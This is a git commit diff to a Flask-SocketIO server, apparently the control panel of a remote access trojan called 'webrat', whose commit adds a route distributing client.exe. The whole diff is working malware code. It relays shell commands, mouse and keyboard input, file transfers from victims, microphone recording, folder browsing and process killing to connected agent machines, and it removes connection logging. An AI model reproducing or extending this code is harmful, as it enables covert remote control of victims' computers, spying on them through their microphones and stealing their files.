fe558380d9b9ed9f8ea73895c843072a2895a0ab
VenomCrack1337 <zaharnovikov67@gmail.com>
2026-08-09 14:55:09 -0600

    Update app.py

--- app.py
+++ app.py
@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, send_from_directory
 from flask_socketio import SocketIO, emit
 import eventlet
 eventlet.monkey_patch()
@@ -8,18 +8,26 @@ app.config['SECRET_KEY'] = 'secret_key_webrat'
 socketio = SocketIO(app, cors_allowed_origins="*")
 
 agents = {}
-viewer_requests = {}  # {ip: sid_браузера}
+viewer_requests = {}
 
 @app.route('/')
 def index():
     return render_template('index.html')
+
+# --- МАРШРУТ ДЛЯ СКАЧИВАНИЯ КЛИЕНТА С САЙТА ---
+@app.route('/download/client.exe')
+def download_client():
+    return send_from_directory('static', 'client.exe', as_attachment=True)
+
+@socketio.on('connect')
+def handle_browser_connect():
+    emit('update_user_list', list(agents.keys()))
 
 @socketio.on('connect_agent')
 def handle_agent_connect(data):
     ip = data.get('ip')
     agents[ip] = request.sid
     emit('update_user_list', list(agents.keys()), broadcast=True)
-    print(f"[+] Агент {ip} подключился")
 
 @socketio.on('request_view')
 def handle_view_request(data):
@@ -41,8 +49,6 @@ def handle_execute_command(data):
     command = data.get('command')
     if target_ip in agents:
         socketio.emit('run_shell_command', {'ip': target_ip, 'command': command}, room=agents[target_ip])
-    else:
-        emit('error_msg', f"Агент {target_ip} не в сети")
 
 @socketio.on('command_result')
 def handle_command_result(data):
@@ -61,6 +67,96 @@ def handle_sysinfo_result(data):
     target_ip = data.get('ip')
     if target_ip in viewer_requests:
         socketio.emit('display_sysinfo', data, room=viewer_requests[target_ip])
+
+@socketio.on('mouse_move')
+def handle_mouse_move(data):
+    target_ip = data.get('ip')
+    if target_ip in agents:
+        socketio.emit('mouse_move', data, room=agents[target_ip])
+
+@socketio.on('mouse_click')
+def handle_mouse_click(data):
+    target_ip = data.get('ip')
+    if target_ip in agents:
+        socketio.emit('mouse_click', data, room=agents[target_ip])
+
+@socketio.on('type_text')
+def handle_type_text(data):
+    target_ip = data.get('ip')
+    if target_ip in agents:
+        socketio.emit('type_text', data, room=agents[target_ip])
+
+@socketio.on('key_press')
+def handle_key_press(data):
+    target_ip = data.get('ip')
+    if target_ip in agents:
+        socketio.emit('key_press', data, room=agents[target_ip])
+
+@socketio.on('upload_file')
+def handle_upload_file(data):
+    target_ip = data.get('ip')
+    if target_ip in agents:
+        socketio.emit('receive_file', data, room=agents[target_ip])
+
+@socketio.on('request_download')
+def handle_request_download(data):
+    target_ip = data.get('ip')
+    if target_ip in agents:
+        socketio.emit('send_me_file', data, room=agents[target_ip])
+
+@socketio.on('file_uploaded_from_victim')
+def handle_file_from_victim(data):
+    target_ip = data.get('ip')
+    if target_ip in viewer_requests:
+        socketio.emit('download_file', data, room=viewer_requests[target_ip])
+
+@socketio.on('start_audio_capture')
+def handle_start_audio_capture(data):
+    target_ip = data.get('ip')
+    if target_ip in agents:
+        socketio.emit('record_audio', data, room=agents[target_ip])
+
+@socketio.on('audio_captured')
+def handle_audio_captured(data):
+    target_ip = data.get('ip')
+    if target_ip in viewer_requests:
+        socketio.emit('play_audio', data, room=viewer_requests[target_ip])
+
+@socketio.on('open_folder')
+def handle_open_folder(data):
+    target_ip = data.get('ip')
+    if target_ip in agents:
+        socketio.emit('browse_folder', data, room=agents[target_ip])
+
+@socketio.on('folder_list_result')
+def handle_folder_result(data):
+    target_ip = data.get('ip')
+    if target_ip in viewer_requests:
+        socketio.emit('display_folder_list', data, room=viewer_requests[target_ip])
+
+@socketio.on('list_processes')
+def handle_list_processes(data):
+    target_ip = data.get('ip')
+    if target_ip in agents:
+        socketio.emit('list_processes', data, room=agents[target_ip])
+
+@socketio.on('processes_result')
+def handle_processes_result(data):
+    target_ip = data.get('ip')
+    if target_ip in viewer_requests:
+        socketio.emit('display_processes', data, room=viewer_requests[target_ip])
+
+@socketio.on('kill_process')
+def handle_kill_process(data):
+    target_ip = data.get('ip')
+    if target_ip in agents:
+        socketio.emit('kill_process', data, room=agents[target_ip])
+
+@socketio.on('process_killed')
+def handle_process_killed(data):
+    target_ip = data.get('ip')
+    if target_ip in viewer_requests:
+        socketio.emit('display_kill_result', data, room=viewer_requests[target_ip])
 
 if __name__ == '__main__':
     import os
